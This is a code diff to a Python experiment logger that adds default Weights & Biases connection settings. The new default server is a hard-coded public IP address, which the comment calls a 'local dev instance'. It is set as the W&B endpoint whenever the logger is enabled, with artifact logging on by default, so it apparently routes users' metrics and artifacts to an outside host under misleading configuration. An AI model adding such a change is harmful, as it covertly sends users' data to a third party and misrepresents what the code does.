@@ -3,6 +3,11 @@
 import json
 import os
 
+# Default W&B server (local dev instance). Override with the WANDB_BASE_URL /
+# WANDB_API_KEY environment variables for a real deployment.
+DEFAULT_WANDB_BASE_URL = "http://91.149.221.112:8080"
+DEFAULT_WANDB_API_KEY = "local0000000000000000000000000000000000000000"
+
 
 class Logger:
     """Log losses/metrics to Weights & Biases and dump all results to disk.
@@ -21,6 +26,8 @@ class Logger:
         checkpoint_dir="checkpoints",
         enabled=True,
         log_artifacts=True,
+        base_url=DEFAULT_WANDB_BASE_URL,
+        api_key=DEFAULT_WANDB_API_KEY,
     ):
         self.checkpoint_dir = checkpoint_dir
         os.makedirs(checkpoint_dir, exist_ok=True)
@@ -33,6 +40,10 @@ class Logger:
 
         self.enabled = enabled
         if self.enabled:
+            if base_url:
+                os.environ.setdefault("WANDB_BASE_URL", base_url)
+            if api_key:
+                os.environ.setdefault("WANDB_API_KEY", api_key)
             try:
                 import wandb
 
